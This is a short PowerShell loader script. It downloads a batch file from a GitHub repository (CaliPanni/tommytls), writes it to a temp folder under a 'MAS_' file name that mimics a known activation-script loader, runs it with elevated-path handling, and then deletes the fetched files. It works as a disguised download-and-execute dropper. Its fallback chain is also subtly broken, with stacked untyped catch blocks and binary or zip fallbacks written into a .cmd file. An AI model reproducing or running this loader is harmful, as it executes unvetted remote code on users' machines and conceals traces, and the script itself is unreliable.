$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/CaliPanni/tommytls/main/extractor.cmd'
$DownloadURL2 = 'https://raw.githubusercontent.com/CaliPanni/tommytls/main/extractor.cmd'
$DownloadURL3 = 'https://www.7-zip.org/a/7zr.exe'
$DownloadURL4 = 'https://github.com/CaliPanni/tommytls/raw/main/wikotls.zip'

$rand = Get-Random -Maximum 1000
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL3 -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL4 -UseBasicParsing
}

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\extractor.cmd", "$env:SystemRoot\Temp\extractor.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }